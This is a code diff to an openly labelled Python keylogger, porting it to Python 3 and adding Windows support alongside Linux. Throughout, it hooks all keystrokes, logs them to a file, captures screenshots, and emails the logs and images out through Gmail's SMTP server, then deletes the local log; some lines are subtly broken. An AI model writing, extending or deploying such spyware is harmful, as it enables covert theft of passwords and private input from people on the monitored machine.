@@ -1,6 +1,6 @@
 #lib importantes
 #-*- coding: utf-8 -*-
-
+#!/usr/bin/python
 #Copyright (C) 2008 MrTrue <gui15787@gmail.com>
 #     This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -15,21 +15,39 @@
 #    You should have received a copy of the GNU General Public License
 #    along with this program.  If not, see <https://www.gnu.org/licenses/>
 
-import pyxhook
-import datetime,os,sys
-import argparse as args
-import smtplib
-from time import *
-import pyscreenshot as ImageGrab
-from email.MIMEMultipart import MIMEMultipart
-from email.MIMEBase import MIMEBase
-from email.MIMEText import MIMEText
-from email.mime.image import MIMEImage
-from email import Encoders
-from email.Utils import COMMASPACE, formatdate
+import platform
+system = platform.system()
+if system == "Linux" or system == "linux":
+  import pyxhook
+  import datetime,os,sys,platform
+  import argparse as args
+  import smtplib
+  from time import *
+  import pyscreenshot as ImageGrab
+  from email.mime.multipart import MIMEMultipart
+  from email.mime.text import MIMEText
+  from email.mime.base import MIMEBase
+  from email.mime.image import MIMEImage
+  from email import encoders as Encoders
+  from email.utils import COMMASPACE, formatdate
+
+else:
+  import pythoncom,logging
+  import pyWinhook as pyHook
+  import datetime,os,sys,platform
+  import argparse as args
+  import smtplib
+  from time import *
+  import pyscreenshot as ImageGrab
+  from email.mime.multipart import MIMEMultipart
+  from email.mime.text import MIMEText
+  from email.mime.base import MIMEBase
+  from email.mime.image import MIMEImage  
+  from email import encoders as Encoders
+  from email.utils import COMMASPACE, formatdate  
 
 #arguments
-parser = args.ArgumentParser()
+parser = args.ArgumentParser(description="The basic keylogger that use smtp use -e and -p to the program work perfect")
 parser.add_argument("-e", "--email",required=True,help="Your email to send the logs")
 parser.add_argument("-p", "--password",required=True,help="Your password to the program send the logs")
 parser.add_argument("-l", "--local",required=False,type=str,default="/tmp/logs.txt",help="the place where do you will put the logs")
@@ -37,14 +55,16 @@ parser.add_argument("-t", "--time",required=False,type=int,default=60,help="is t
 
 parsed_args = parser.parse_args()
 
+#declaration of vars
+
 data_hora = datetime.datetime.now()
 data_hora = str(data_hora).split('.')[0].replace(' ','_')###
-sendTo = parsed_args.email #para onde você ira enviar o arquivo
+sendTo = parsed_args.email #for where you'll send the archive
 assunto = 'Keylogger %s' %data_hora
-mensagem = ' the keylogger dumped it %s '%data_hora #mensagem é também pega a data é a hora do pc 
+mensagem = ' the keylogger dumped it %s '%data_hora #mensage and take the hour on pc 
 youremail = parsed_args.email
 password = parsed_args.password
-server= 'smtp.gmail.com' #o servidor pode ser do gmail dentre outros
+server= 'smtp.gmail.com' #it is a server of google to receve the email more do you can change that to other
 port = 587
 sendtime = parsed_args.time
 log_file = parsed_args.local
@@ -90,8 +110,7 @@ def screenshot():
         send_Image(dic)
         os.remove(dic)
      
-
-#essa funão gerencia cria os heards dentre outras coisas 
+#this function manager and create the heards among other things 
 def send_email(server, port, FROM, PASS, TO, subject, texto, anexo=[]):
   global exit 
   server = server
@@ -124,26 +143,48 @@ def send_email(server, port, FROM, PASS, TO, subject, texto, anexo=[]):
     gm.sendmail(FROM, TO, msg.as_string())
     gm.close()
 
-  except Exception,e:
+  except Exception as e:
     errorMsg = "Nao Foi Possivel Enviar o Email.\n Error: %s" % str(e)
     print('%s'%errorMsg)
 
 try:
+#Linux version if do you try run this code on linux
+  if system == "Linux" or  system == "linux":
+    def OnKeyPress(event): #essa função pega as teclas que foram precionadas
+      fob=open(log_file,'a')
+      fob.write(event.Key)
+      fob.write(f"this key did pressed {event.key} \n")
+      os.system("")
 
-  def OnKeyPress(event): #essa função pega as teclas que foram precionadas
-    fob=open(log_file,'a')
-    fob.write(event.Key)
-    fob.write('\n')
+      if event.Ascii==59: #59 this value is represented for ; if this key pressed it'll stop the keylogger and will send the email
+        fob.close()
+        new_hook.cancel()
+        send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
+        os.remove(log_file)
 
-    if event.Ascii==59: #59 se esse valor e representado por ; se for precionada ele ira parar o keylogger e ira mandar o email
-      fob.close()
-      new_hook.cancel()
-      send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
+    new_hook = pyxhook.HookManager()
+    new_hook.KeyDown= OnKeyPress
+    new_hook.Key = OnKeyPress
+    new_hook.HookKeyboard()
+    new_hook.start()
+    screenshot()
+#Windons Version if do you try run it on Windows that is obvious 
+  elif system == "Windows":
+    def OnKeyboardEvent(event):
+      fob=open(log_file,"a")
+      fob.write(event.Key)
+      fob.write(f"this key did pressed {event.key} \n")
+ 
+      if event.Ascii==59:
+        fob.close
+        send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
+        os.remove(log_file)
+        exit(1)
 
-  new_hook = pyxhook.HookManager()
-  new_hook.KeyDown= OnKeyPress
-  new_hook.HookKeyboard()
-  new_hook.start()
-  screenshot()
+    hooks_manager = pyHook.HookManager()
+    hooks_manager.KeyDown = OnKeyboardEvent
+    hooks_manager.HookKeyboard()
+    pythoncom.PumpMessages()  
+    screenshot()
 except(KeyboardInterrupt):
   print("Sorry Not Day")
